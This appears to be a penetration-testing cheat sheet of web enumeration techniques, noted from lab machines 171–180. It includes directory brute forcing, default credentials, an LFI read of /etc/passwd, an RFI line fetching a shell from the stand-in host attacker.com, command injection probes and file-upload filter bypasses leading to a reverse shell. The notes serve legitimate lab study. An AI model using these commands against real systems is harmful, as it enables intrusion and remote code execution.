## 🌐 Web Enumeration (Machines 171–180)

### Techniques and Observations

```bash
# Common directories and pages
curl -I http://<IP>/admin.php             # Admin panels
curl -I http://<IP>/config.php            # Configuration files
curl -I http://<IP>/backup                # Backup directories

# Default credentials
admin:admin
admin:password
test:test

# Directory Brute Force
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# LFI / RFI Tests
curl "http://<IP>/vuln.php?page=../../../../etc/passwd"
curl "http://<IP>/vuln.php?page=http://attacker.com/shell.txt"

# Command Injection
curl "http://<IP>/vuln.php?cmd=ls"
curl "http://<IP>/vuln.php?cmd=whoami"

# CMS Detection
whatweb http://<IP>
wpscan --url http://<IP> --enumerate u

# File Upload
Check for:
- Bypassing filters: shell.php.jpg
- Null byte injection: shell.php%00.jpg
- .htaccess trick: RewriteEngine

# Observed in Machines 171–180
- Machine 172: Found LFI via `page` parameter and used it for code execution
- Machine 174: WordPress enumeration exposed admin credentials
- Machine 176: File upload bypass allowed `.php5` reverse shell
- Machine 178: FFUF revealed sensitive `/private` directory
```
